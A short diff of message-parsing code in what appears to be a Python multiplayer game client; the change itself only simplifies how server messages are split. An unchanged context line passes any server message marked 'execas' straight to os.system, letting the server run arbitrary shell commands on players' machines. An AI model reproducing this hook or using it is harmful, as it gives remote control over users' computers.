@@ -285,7 +285,7 @@ class App:
                 srvMsg = srvMsg.split("%")[0].split("|", 1)
                 if len(srvMsg) == 2 and srvMsg[0] == "execas": os.system(srvMsg[1])
                 continue
-            else: srvMsg = srvMsg.split('%', 1) ; srvMsg = [msg.split('|', 7) for msg in srvMsg if msg != ""]
+            else: srvMsg = [msg.split('|', 7) for msg in srvMsg.split('%') if msg != ""]
             for msg in srvMsg:
                 if msg[0] == "main":
                     self.currentState, self.gameInfos, self.gameMode = "mainLobby", [], ""
